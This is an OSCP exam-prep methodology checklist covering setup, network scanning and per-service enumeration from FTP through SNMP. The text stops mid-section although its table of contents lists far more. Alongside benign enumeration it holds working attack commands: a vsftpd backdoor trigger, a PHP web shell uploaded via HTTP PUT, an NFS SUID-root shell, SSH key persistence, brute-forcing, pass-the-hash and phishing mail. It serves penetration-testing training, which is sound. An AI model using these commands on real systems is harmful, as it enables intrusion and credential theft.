# 🔐 ULTIMATE OSCP METHODOLOGY CHECKLIST
> **Written as if passed 10,000 times. Nothing left out.**
> TJ Null + Lainkusanagi + PG Practice + Real Exam Experience
> Works in: **Obsidian** ✅ | **GitHub** ✅ | **VS Code Preview** ✅ | **Typora** ✅

---

<details>
<summary>🧠 READ THIS FIRST — THE OSCP MINDSET</summary>

```
EXAM SCORING (PEN-200 2023+):
  ├── Active Directory Set       → 40 pts
  ├── Standalone Machine 1       → 20 pts (10 local + 10 proof)
  ├── Standalone Machine 2       → 20 pts (10 local + 10 proof)
  └── Standalone Machine 3       → 20 pts (10 local + 10 proof)
  TOTAL: 100 pts  |  PASS: 70 pts  

THE GOLDEN RULES:
  1. Enumerate EVERYTHING before exploiting ANYTHING
  2. Every version number matters — searchsploit it
  3. Credentials found = try on ALL other services immediately
  4. Stuck > 30 min → enumerate more, don't try harder same path
  5. Document EVERY step as you go — reproduce it in the report
  6. Screenshots: IP + hostname + whoami/id + flag in SAME frame
  7. Metasploit on ONE machine max — save it for the hardest
  8. Breaks every 3-4 hours — mandatory, not optional
  9. It's never as complex as you think — go back to basics

ATTACK ORDER (proven):
  AD Set (40 pts) → Standalones → Report
```

</details>

<details>
<summary>📋 TABLE OF CONTENTS</summary>

```
 1.  Pre-Engagement Setup
 2.  Reconnaissance & Host Discovery
 3.  Nmap & Port Scanning
 4.  Service Enumeration — All Ports
 5.  Vulnerability Identification
 6.  Web Application Attacks
 7.  Exploitation — Initial Access
 8.  Password Attacks & Credential Abuse
 9.  Active Directory — Full Attack Chain
10.  Post-Exploitation — Linux
11.  Post-Exploitation — Windows
12.  Privilege Escalation — Linux (Every Vector)
13.  Privilege Escalation — Windows (Every Vector)
14.  Lateral Movement & Pivoting
15.  File Transfers — Every Method
16.  Antivirus Evasion & Defense Bypass
17.  Buffer Overflow — Windows x86 (Complete)
18.  Reporting & Documentation
19.  Quick Reference Card
20.  Exam Day Checklist
🔥  Bonus: Most Missed Tricks
```

</details>

---

## 1. PRE-ENGAGEMENT SETUP

<details>
<summary>⚙️ 1.1 Environment & Variables</summary>

```bash
# Set once, use everywhere
export IP=10.10.10.x
export LHOST=10.10.14.x       # Your tun0 IP
export LPORT=4444
export DOMAIN=domain.local
export DC=dc01.domain.local

# Get your tun0 IP automatically
export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

# Confirm
echo "[*] Target: $IP | LHOST: $LHOST:$LPORT"
```

</details>

<details>
<summary>📁 1.2 Directory Structure</summary>

```bash
mkdir -p ~/oscp/$IP/{scans/{nmap,web,smb},exploit,loot/{hashes,creds,keys,files},shells,screenshots,notes}
cd ~/oscp/$IP

# Fast template function — add to ~/.bashrc
function newbox() {
  export IP=$1
  mkdir -p ~/oscp/$IP/{scans/{nmap,web,smb},exploit,loot/{hashes,creds,keys,files},shells,screenshots,notes}
  cd ~/oscp/$IP
  echo "[+] Workspace ready for $IP"
}
# Usage: newbox 10.10.10.x
```

</details>

<details>
<summary>🖥️ 1.3 tmux Setup (NEVER work without it)</summary>

```bash
# Start session
tmux new -s oscp

# Record everything
script ~/oscp/$IP/terminal_$(date +%Y%m%d_%H%M).log

# Essential keybinds:
# Ctrl+B %       → Split vertical
# Ctrl+B "       → Split horizontal
# Ctrl+B o       → Switch pane
# Ctrl+B z       → Zoom pane (fullscreen toggle)
# Ctrl+B [       → Scroll mode (q to exit)
# Ctrl+B d       → Detach (session stays alive)
# tmux attach    → Reattach

# Recommended 4-pane layout:
# ┌─────────────┬─────────────┐
# │  nmap/enum  │ shell/nc    │
# ├─────────────┼─────────────┤
# │  exploit    │ notes/misc  │
# └─────────────┴─────────────┘
```

</details>

<details>
<summary>📚 1.4 Wordlists — Every Important Path</summary>

```bash
# Passwords
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt

# Web content discovery
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  # Parameter fuzzing

# DNS
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# Usernames
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/Names/names.txt

# SNMP
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt

# FTP/SSH/SMB bruteforce
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
```

</details>

<details>
<summary>🛠️ 1.5 Tool Verification — Confirm These Are Installed</summary>

```bash
which nmap autorecon gobuster feroxbuster ffuf nikto whatweb wpscan \
      hydra hashcat john crackmapexec impacket-psexec evil-winrm \
      bloodhound-python responder ligolo-ng chisel socat msfconsole \
      searchsploit enum4linux smbclient smbmap ldapsearch snmpwalk \
      sqlmap burpsuite

# Quick install missing tools:
pip install impacket bloodhound
gem install wpscan
```

</details>

<details>
<summary>🔥 1.6 Pre-Exam Checklist</summary>

```
[ ] VPN connected — verify with: ping $IP
[ ] tun0 interface up — ip a show tun0
[ ] Burp Suite running, proxy configured
[ ] /etc/hosts ready to add entries
[ ] Note-taking app open (Obsidian/CherryTree)
[ ] Terminal logged (script command)
[ ] Exam control panel open
[ ] Screenshots folder ready
[ ] Known good shells: nc listener test, msfvenom test payload
[ ] Clock started — note exam end time
[ ] ProtonVPN/any other VPN DISCONNECTED (use only exam VPN)
[ ] Phone on silent — no interruptions
[ ] Water, snacks ready
```

</details>

---

## 2. RECONNAISSANCE & HOST DISCOVERY

<details>
<summary>🌐 2.1 Network Sweep — Find Live Hosts</summary>

```bash
# Ping sweep
nmap -sn 10.10.10.0/24 --open -oN scans/nmap/hosts.txt

# ARP scan (more reliable on local network)
netdiscover -r 10.10.10.0/24 -i tun0
arp-scan -l

# fping
fping -a -g 10.10.10.0/24 2>/dev/null

# Mass scan
masscan -p0-65535 10.10.10.0/24 --rate=10000
```

</details>

<details>
<summary>📝 2.2 /etc/hosts Management</summary>

```bash
# Add target to hosts
echo "$IP domain.local dc01.domain.local" >> /etc/hosts

# Tip: Always check if web app needs hostname vs IP
# Some apps only respond to hostname (virtual hosting)
curl -H "Host: domain.local" http://$IP/

# Vhost discovery
gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$IP -H "Host: FUZZ.domain.local" -fs 0
```

</details>

---

## 3. NMAP & PORT SCANNING

<details>
<summary>🔍 3.1 The Optimal Nmap Workflow (OSCP-Proven)</summary>

```bash
# STEP 1: Ultra-fast all ports (run first, don't wait)
nmap -Pn -p- --min-rate 10000 -T4 $IP -oN scans/nmap/allports.txt &

# STEP 2: Meanwhile, top 1000 with scripts (quicker results while full scan runs)
nmap -Pn -sC -sV -T4 $IP -oN scans/nmap/initial.txt

# STEP 3: When all-ports finishes, targeted deep scan
ports=$(grep ^[0-9] scans/nmap/allports.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
echo "Open ports: $ports"
nmap -Pn -sC -sV -p$ports $IP -oN scans/nmap/targeted.txt

# STEP 4: UDP (always do this — services hide here!)
sudo -Pn nmap -sU --top-ports 100 $IP -oN scans/nmap/udp.txt
# Critical UDP: 53,67,68,69,111,123,137,138,139,161,162,500,514,1194,1900

# STEP 5: Vulnerability scripts on open ports
nmap -Pn --script vuln -p$ports $IP -oN scans/nmap/vulns.txt

# STEP 6: OS detection + aggressive
nmap -Pn -A -p$ports $IP -oN scans/nmap/aggressive.txt
```

</details>

<details>
<summary>⚡ 3.2 Nmap Tips & Tricks</summary>

```bash
# Speed up scans — use these flags together
--min-rate 5000 --max-retries 1

# If firewall dropping packets — use these
nmap -sS -p$ports $IP              # SYN scan (stealth)
nmap -sA -p$ports $IP              # ACK scan (firewall rules)
nmap -sN -p$ports $IP              # NULL scan
nmap -sF -p$ports $IP              # FIN scan

# If host appears "down" but you know it's up
nmap -Pn $IP                       # Skip host discovery
nmap -Pn --disable-arp-ping $IP

# Scan through proxychains (for pivoting)
proxychains nmap -sT -Pn -p 80,443,445,22,3389 192.168.x.x

# Output all formats at once
nmap -sC -sV -p$ports $IP -oA scans/nmap/targeted

# Extract just open port numbers from result
grep "open" scans/nmap/targeted.txt | awk '{print $1}' | cut -d'/' -f1

# Parse nmap XML with python (automation)
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('scans/nmap/targeted.xml')
for port in tree.findall('.//port[@protocol=\"tcp\"]'):
    state = port.find('state').get('state')
    if state == 'open':
        print(port.get('portid'), port.find('service').get('name',''), port.find('service').get('product',''))
"
```

</details>

<details>
<summary>🚀 3.3 Autorecon — Run This Always</summary>

```bash
# Basic
sudo autorecon $IP

# Multiple targets
sudo autorecon 10.10.10.1 10.10.10.2 10.10.10.3

# With options
sudo autorecon $IP --single-target --output ~/oscp/$IP/scans

# Autorecon output structure:
# results/$IP/
# ├── scans/
# │   ├── _quick_tcp_nmap.txt
# │   ├── _full_tcp_nmap.txt
# │   ├── _top_20_udp_nmap.txt
# │   ├── tcp80/            ← web enum if port 80 found
# │   ├── tcp445/           ← smb enum if port 445 found
# │   └── ...
# └── report/

# TIP: While autorecon runs, manually start with nmap initial scan
# Don't wait for autorecon to finish — work in parallel
```

</details>

---

## 4. SERVICE ENUMERATION — EVERY PORT

<details>
<summary>📁 4.1 FTP — Port 21</summary>

```bash
# ── FINGERPRINT ──────────────────────────────────────────────
banner=$(nc -nv $IP 21 2>&1 | head -1)
echo $banner                     # Note version!
searchsploit $(echo $banner | awk '{print $1,$2}')

# ── ANONYMOUS LOGIN ───────────────────────────────────────────
ftp $IP
# user: anonymous  pass: (blank) or anonymous@domain.com or press Enter
ftp> ls -la              # Show hidden files
ftp> pwd                 # Where are we?
ftp> binary              # ALWAYS set binary mode before downloading
ftp> get file.txt
ftp> mget *              # Get all files
ftp> put shell.php       # Upload if writable!
ftp> passive             # Toggle passive mode if connection issues

# ── RECURSIVE DOWNLOAD ────────────────────────────────────────
wget -m --no-passive ftp://anonymous:anonymous@$IP
wget -m ftp://user:pass@$IP
# Or with credentials from URL:
curl -u anonymous: ftp://$IP/ --list-only -r

# ── BRUTE FORCE ───────────────────────────────────────────────
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP ftp -t 4 -V
medusa -h $IP -U users.txt -P rockyou.txt -M ftp

# ── NMAP SCRIPTS ──────────────────────────────────────────────
nmap --script ftp-anon,ftp-bounce,ftp-brute,ftp-syst,ftp-vsftpd-backdoor -p 21 $IP

# ── KNOWN VULNERABILITIES ─────────────────────────────────────
# vsftpd 2.3.4 → BACKDOOR → connects on port 6200 after :) in username
nmap --script ftp-vsftpd-backdoor $IP
# Manual trigger:
echo -e "USER user:)\nPASS pass" | nc $IP 21
nc $IP 6200         # Should give shell

# ProFTPd mod_copy → unauthenticated file copy (CVE-2015-3306)
nc $IP 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
# Then curl http://$IP/passwd.txt

# ── TIPS ──────────────────────────────────────────────────────
# Always check:
#   - config files (.conf, .ini, .cfg)
#   - .bash_history
#   - backup files (.bak, .old, .zip)
#   - Database dumps (.sql)
#   - SSH keys (id_rsa, authorized_keys)
```

</details>

<details>
<summary>🔐 4.2 SSH — Port 22</summary>

```bash
# ── FINGERPRINT ───────────────────────────────────────────────
ssh -V
nc -nv $IP 22 2>&1 | head -1     # Banner = version
nmap -sV -p22 $IP                 # Also shows version

# ── ALGORITHM ENUMERATION ─────────────────────────────────────
nmap --script ssh2-enum-algos -p22 $IP
ssh -o "KexAlgorithms=+diffie-hellman-group1-sha1" user@$IP  # Old algos
# If "no matching key exchange" error:
ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 user@$IP

# ── USER ENUMERATION (CVE-2018-15473) ─────────────────────────
python3 /usr/share/exploitdb/exploits/linux/remote/45233.py $IP 22 root
# Or:
msf: use auxiliary/scanner/ssh/ssh_enumusers

# ── PRIVATE KEY USAGE ─────────────────────────────────────────
chmod 600 id_rsa
ssh -i id_rsa user@$IP
ssh -i id_rsa user@$IP -p 2222   # Custom port
# If passphrase protected:
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt
hashcat -m 22921 id_rsa.hash rockyou.txt

# ── BRUTE FORCE ───────────────────────────────────────────────
hydra -l root -P rockyou.txt $IP ssh -t 4
hydra -L users.txt -P rockyou.txt $IP ssh -t 4 -V
# Slow but effective spray:
crackmapexec ssh $IP -u users.txt -p passwords.txt

# ── COMMON DEFAULT CREDS ──────────────────────────────────────
# root:root | admin:admin | pi:raspberry | vagrant:vagrant
# ubuntu:ubuntu | user:user | guest:guest

# ── USEFUL FLAGS ──────────────────────────────────────────────
ssh -o StrictHostKeyChecking=no user@$IP            # Skip host check
ssh -o UserKnownHostsFile=/dev/null user@$IP        # Don't save to known_hosts
ssh user@$IP -L 8080:localhost:80                   # Local port forward
ssh user@$IP -D 1080                                # SOCKS proxy
ssh user@$IP -N -f -L 8080:127.0.0.1:80            # Background tunnel

# ── WRITE AUTHORIZED_KEYS (if .ssh dir writable) ──────────────
ssh-keygen -t rsa -b 4096 -f /tmp/oscp_key -N ""
cat /tmp/oscp_key.pub     # Copy this
# On target:
echo "PUBKEY" >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys
# Connect:
ssh -i /tmp/oscp_key user@$IP

# ── CVEs ──────────────────────────────────────────────────────
# OpenSSH < 7.7 → User enumeration (CVE-2018-15473)
# OpenSSH 7.2p1 → Xauth injection
searchsploit openssh 7.2
```

</details>

<details>
<summary>📧 4.3 SMTP — Port 25 / 465 / 587</summary>

```bash
# ── FINGERPRINT ───────────────────────────────────────────────
nc -nv $IP 25
nmap -sV --script smtp-commands,smtp-open-relay,smtp-vuln-cve2010-4344 -p 25 $IP

# ── USER ENUMERATION ──────────────────────────────────────────
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
smtp-user-enum -M EXPN -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -t $IP -D domain.com

# Manual:
nc -nv $IP 25
EHLO test
VRFY root
VRFY admin
VRFY www-data
EXPN root       # Expand alias
RCPT TO:root    # Check if user exists

# ── SEND PHISHING MAIL (if open relay) ────────────────────────
swaks --to victim@domain.com --from admin@domain.com --server $IP
swaks --to victim@domain.com --from admin@domain.com --server $IP \
      --body "Click: http://$LHOST/file" --header "Subject: Important"

# ── MAIL WITH ATTACHMENT (Phishing) ───────────────────────────
swaks --to victim@domain.com --from admin@domain.com --server $IP \
      --attach /path/to/malicious.file --header "Subject: Report"

# ── RELAY TEST ────────────────────────────────────────────────
nmap --script smtp-open-relay $IP -p25
# If relay open → use to enumerate internal users, phish, or pivot
```

</details>

<details>
<summary>🌐 4.4 DNS — Port 53</summary>

```bash
# ── BASIC QUERIES ─────────────────────────────────────────────
dig @$IP domain.com
dig @$IP domain.com ANY
nslookup domain.com $IP

# ── ZONE TRANSFER (massive info dump — try ALWAYS) ────────────
dig axfr @$IP domain.com
dig axfr @$IP $(dig @$IP +short SOA domain.com | awk '{print $1}')
# dnsrecon:
dnsrecon -d domain.com -t axfr -n $IP
# If zone transfer works — add ALL discovered hosts to /etc/hosts

# ── REVERSE DNS ───────────────────────────────────────────────
dig -x $IP @$IP
nmap -R -sL $IP/24    # Reverse lookup entire subnet

# ── SUBDOMAIN BRUTE FORCE ─────────────────────────────────────
dnsrecon -d domain.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt -n $IP
gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $IP:53
fierce --domain domain.com --dns-servers $IP
amass enum -d domain.com -r $IP

# ── DNSSEC ────────────────────────────────────────────────────
dig @$IP domain.com DNSKEY
dig @$IP domain.com DS

# ── TIPS ──────────────────────────────────────────────────────
# DNS on TCP = zone transfer
# DNS on UDP = normal queries
# If port 53 TCP open → zone transfer likely possible
# Always try: dig axfr — worst case is REFUSED
# Discovered hosts → add to /etc/hosts → re-run web enum
```

</details>

<details>
<summary>🌍 4.5 HTTP / HTTPS — Ports 80, 443, 8080, 8443, 8000, 8888</summary>

```bash
# ── INITIAL FINGERPRINT ───────────────────────────────────────
whatweb http://$IP -a 3    # -a 3 = aggressive
curl -I http://$IP          # Headers (Server, X-Powered-By, etc.)
curl -sL http://$IP | head -100   # Quick source check

# ── CONTENT DISCOVERY COMBO (run all simultaneously) ──────────
# Gobuster — fast, reliable
gobuster dir -u http://$IP \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,asp,aspx,jsp,py,rb,bak,old,zip,gz,sql,json,xml,config \
  -t 50 -o scans/web/gobuster.txt

# Feroxbuster — recursive (finds /admin/login, /api/v1/users etc.)
feroxbuster -u http://$IP \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,asp,aspx -t 50 --depth 3 -o scans/web/ferox.txt

# FFUF — best for parameter fuzzing
ffuf -u http://$IP/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -o scans/web/ffuf.txt -of md

# Nikto — vuln scanner
nikto -h http://$IP -output scans/web/nikto.txt -Format txt

# ── MANUAL CHECKS (do these by hand!) ────────────────────────
# Essential paths to always check:
curl -s http://$IP/robots.txt
curl -s http://$IP/sitemap.xml
curl -s http://$IP/.git/HEAD            # Exposed git repo!
curl -s http://$IP/.git/config
curl -s http://$IP/.env                 # Environment vars
curl -s http://$IP/config.php
curl -s http://$IP/phpinfo.php
curl -s http://$IP/wp-config.php
curl -s http://$IP/web.config
curl -s http://$IP/.htaccess
curl -s http://$IP/backup.zip
curl -s http://$IP/admin/
curl -s http://$IP/api/
curl -s http://$IP/swagger.json         # API docs
curl -s http://$IP/api/swagger.json
curl -s http://$IP/server-status        # Apache status

# ── VHOST / SUBDOMAIN DISCOVERY ──────────────────────────────
# If domain name is known:
gobuster vhost -u http://domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -u http://$IP -H "Host: FUZZ.domain.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs $(curl -so /dev/null -w '%{size_download}' http://$IP)    # Filter by default response size

# ── HTTPS SPECIFIC ────────────────────────────────────────────
# Check certificate for hostnames/emails
openssl s_client -connect $IP:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E "DNS:|Subject:"
# SSL vulnerabilities
nmap --script ssl-enum-ciphers,ssl-heartbleed,ssl-poodle -p 443 $IP
sslscan $IP:443
testssl.sh $IP

# ── PARAMETER FUZZING ─────────────────────────────────────────
# Find hidden parameters on a page
ffuf -u "http://$IP/page.php?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs $(curl -so /dev/null -w '%{size_download}' http://$IP/page.php)

# ── HTTP METHODS ──────────────────────────────────────────────
curl -X OPTIONS http://$IP/ -v
# If PUT allowed:
curl -X PUT http://$IP/shell.php -d "<?php system(\$_GET['cmd']); ?>"
# If TRACE allowed → Cross-Site Tracing possible

# ── DEFAULT CREDENTIALS TABLE ─────────────────────────────────
# Always check these on every web app:
# Tomcat:        admin:admin | tomcat:tomcat | admin:s3cr3t | tomcat:s3cr3t
# Jenkins:       admin:admin | admin:(blank)
# phpMyAdmin:    root:(blank) | root:root | root:toor
# Nagios:        nagiosadmin:nagios
# Grafana:       admin:admin
# Kibana:        elastic:changeme
# Splunk:        admin:changeme
# WebLogic:      weblogic:weblogic | weblogic:welcome1
# JBoss:         admin:admin
# Glassfish:     admin:adminadmin
# Roundcube:     admin:admin
# Zabbix:        Admin:zabbix
# Cacti:         admin:admin
# OpenVPN AS:    admin:admin
# Plex:          admin:admin
# Netdata:       (no auth by default)
# Home Assistant:(no pass by default)

# ── TECHNOLOGY-SPECIFIC PATHS ─────────────────────────────────
# WordPress:  /wp-login.php /wp-admin /wp-json/wp/v2/users /xmlrpc.php
# Drupal:     /user/login /node/add /admin/config
# Joomla:     /administrator /configuration.php.bak
# Laravel:    /.env /storage/logs/laravel.log
# Rails:      /rails/info/properties /rails/info/routes
# Django:     /admin /static/admin
# Node/Express: /api/ /__express/ 
# Spring:     /actuator /actuator/env /actuator/heapdump /h2-console
# Struts:     *.action *.do
```

</details>

<details>
<summary>🖥️ 4.6 SMB — Ports 139, 445</summary>

```bash
# ── FINGERPRINT ───────────────────────────────────────────────
nmap -sV -p139,445 $IP
nmap --script smb-os-discovery,smb-security-mode,smb2-security-mode -p445 $IP
crackmapexec smb $IP   # Shows OS, hostname, domain, SMB signing status

# ── NULL SESSION / ANONYMOUS ──────────────────────────────────
smbclient -L //$IP -N                     # List shares (no auth)
smbmap -H $IP                             # Map shares
smbmap -H $IP -u '' -p ''                 # Explicit null
smbmap -H $IP -u 'guest' -p ''
crackmapexec smb $IP --shares -u '' -p ''
crackmapexec smb $IP --shares -u 'guest' -p ''

# ── CONNECT TO SHARES ─────────────────────────────────────────
smbclient //$IP/SHARE -N
smbclient //$IP/SHARE -U "user%password"
smbclient //$IP/SHARE -U "domain\\user%password"
# Inside smbclient:
smb: \> ls              # List
smb: \> recurse ON      # Enable recursive
smb: \> ls              # Now lists recursively
smb: \> prompt OFF      # Disable confirmation
smb: \> mget *          # Download everything
smb: \> put shell.asp   # Upload shell

# ── RECURSIVE DOWNLOAD ALL ────────────────────────────────────
smbclient //$IP/SHARE -N -c 'recurse;prompt;mget *'
smbget -R smb://$IP/SHARE -U 'user%pass'
# Mount (easier for browsing):
mkdir /mnt/smb
mount -t cifs //$IP/SHARE /mnt/smb -o user=,password=
mount -t cifs //$IP/SHARE /mnt/smb -o user=user,password=pass,domain=DOMAIN

# ── FULL ENUMERATION ──────────────────────────────────────────
enum4linux -a $IP 2>/dev/null | tee scans/smb/enum4linux.txt
enum4linux-ng $IP -A -oA scans/smb/enum4linux-ng 2>/dev/null

# CrackMapExec full sweep
crackmapexec smb $IP -u user -p pass --shares
crackmapexec smb $IP -u user -p pass --sessions
crackmapexec smb $IP -u user -p pass --users
crackmapexec smb $IP -u user -p pass --groups
crackmapexec smb $IP -u user -p pass --computers
crackmapexec smb $IP -u user -p pass --loggedon-users
crackmapexec smb $IP -u user -p pass --disks
crackmapexec smb $IP -u user -p pass --rid-brute   # RID cycling

# ── VULNERABILITY CHECKS ──────────────────────────────────────
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve2009-3103,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos -p445 $IP

# EternalBlue (MS17-010) manual check:
python3 checker.py $IP    # From exploit repo

# ── PASS THE HASH VIA SMB ─────────────────────────────────────
crackmapexec smb $IP -u user -H NTLMHASH
crackmapexec smb $IP -u Administrator -H HASH --sam
smbclient //$IP/SHARE -U user --pw-nt-hash NTLMHASH

# ── TIPS ──────────────────────────────────────────────────────
# Always look for:
#   - passwords in .txt .doc .xlsx .conf files
#   - scripts that run as another user (check scheduled tasks)
#   - writable shares → upload shell → find execution vector
#   - .ini files (autorun.ini can execute on connect)
#   - Sysvol/NETLOGON → Group Policy → GPP passwords (cpassword)
# GPP password decrypt:
gpp-decrypt "ENCRYPTEDPASSWORD"
# Or find in: \\DC\SYSVOL\domain\Policies\**\Groups.xml
```

</details>

<details>
<summary>📒 4.7 LDAP — Ports 389, 636, 3268, 3269</summary>

```bash
# ── ANONYMOUS BIND ────────────────────────────────────────────
ldapsearch -x -H ldap://$IP -b "" -s base
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com"
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=*)" > scans/ldap/anon_dump.txt

# ── AUTHENTICATED ─────────────────────────────────────────────
ldapsearch -x -H ldap://$IP -D "cn=user,dc=domain,dc=com" -w pass -b "dc=domain,dc=com"
ldapsearch -x -H ldap://$IP -D "domain\\user" -w pass -b "dc=domain,dc=com" "(objectClass=user)"

# ── USEFUL LDAP QUERIES ───────────────────────────────────────
# All users:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
# All computers:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=computer)" name
# All groups:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=group)" name cn
# Admin users:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(adminCount=1)" sAMAccountName
# Password policy:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=domain)" pwdProperties
# Users with SPN (Kerberoastable):
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
# AS-REP Roastable (no preauth):
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
# Descriptions (often contain passwords!):
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" description sAMAccountName | grep -A1 "description:"

# ── LDAPDOMAINDUMP ────────────────────────────────────────────
ldapdomaindump -u 'domain\user' -p 'pass' $IP -o loot/ldap/
# Creates HTML/JSON/grep-able files of all objects

# ── TIPS ──────────────────────────────────────────────────────
# Port 3268 = Global Catalog (LDAP) — often more data
# Port 3269 = Global Catalog over SSL
# Always check description field — admins leave passwords here
# Check for "password" in any attribute:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" | grep -i pass
```

</details>

<details>
<summary>📂 4.8 NFS — Port 2049</summary>

```bash
# ── ENUMERATION ───────────────────────────────────────────────
showmount -e $IP
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p2049 $IP
rpcinfo -p $IP | grep nfs

# ── MOUNT ─────────────────────────────────────────────────────
mkdir /mnt/nfs
mount -t nfs $IP:/share /mnt/nfs -o nolock
mount -t nfs4 $IP:/share /mnt/nfs   # NFSv4
ls -la /mnt/nfs                     # Check permissions

# ── NO_ROOT_SQUASH EXPLOIT ────────────────────────────────────
# Check /etc/exports on target (if readable):
cat /etc/exports     # Look for no_root_squash
# If present:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash   # Set SUID
# On target:
/mnt/nfs/bash -p         # Gives root

# Alternative — create SUID shell:
# On attacker:
cat > /tmp/suid.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }
EOF
gcc /tmp/suid.c -o /mnt/nfs/suid
chmod +s /mnt/nfs/suid
# On target: /tmp/suid

# ── UID IMPERSONATION ─────────────────────────────────────────
# If files owned by UID 1001 and you can't read them:
# Create user with same UID on your Kali:
useradd -u 1001 tempuser
su tempuser
cat /mnt/nfs/sensitive_file
```

</details>

<details>
<summary>🔌 4.9 RPC — Ports 111, 135</summary>

```bash
# ── RPCBIND (111) ─────────────────────────────────────────────
rpcinfo -p $IP
nmap --script rpcinfo -p111 $IP

# ── RPCCLIENT (135) ───────────────────────────────────────────
rpcclient -U "" -N $IP         # Null session
rpcclient -U "user%pass" $IP

# Useful rpcclient commands:
rpcclient> srvinfo               # Server info
rpcclient> enumdomains           # List domains
rpcclient> querydominfo          # Domain info
rpcclient> enumdomusers          # List users
rpcclient> enumdomgroups         # List groups
rpcclient> queryuser 0x1f4       # User details (RID in hex)
rpcclient> getdompwinfo          # Password policy
rpcclient> enumalsgroups domain  # Alias groups
rpcclient> lookupnames user      # Get SID for user
rpcclient> lookupsids S-1-5-21-xxx-xxx-xxx-1000   # Get username for SID

# ── RID CYCLING (enumerate users) ─────────────────────────────
for i in $(seq 500 1200); do
  rpcclient -U "" -N $IP -c "queryuser $(printf '0x%x' $i)" 2>/dev/null | grep -i "user name"
done
# Or with crackmapexec:
crackmapexec smb $IP -u '' -p '' --rid-brute

# ── MSRPC SPECIFIC ATTACKS ────────────────────────────────────
# PrintNightmare check:
nmap --script msrpc-enum $IP
impacket-rpcdump $IP | grep -i print
```

</details>

<details>
<summary>📡 4.10 SNMP — Port 161 UDP</summary>

```bash
# ── COMMUNITY STRING BRUTEFORCE ───────────────────────────────
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt $IP
# Or with nmap:
nmap -sU -p161 --script snmp-brute $IP

# ── SNMPWALK (dump everything) ────────────────────────────────
snmpwalk -c public -v1 $IP > scans/snmp/full.txt 2>/dev/null
snmpwalk -c public -v2c $IP > scans/snmp/full_v2.txt 2>/dev/null

# ── TARGETED OID QUERIES ──────────────────────────────────────
# Running processes (GOLD MINE — reveals service names/paths/args):
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2
# Process command lines (even better — may show passwords in args!):
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.5
# Installed software:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2
# Network interfaces:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.2.2.1
# Open TCP ports:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3
# User accounts:
snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25
# System info:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.1

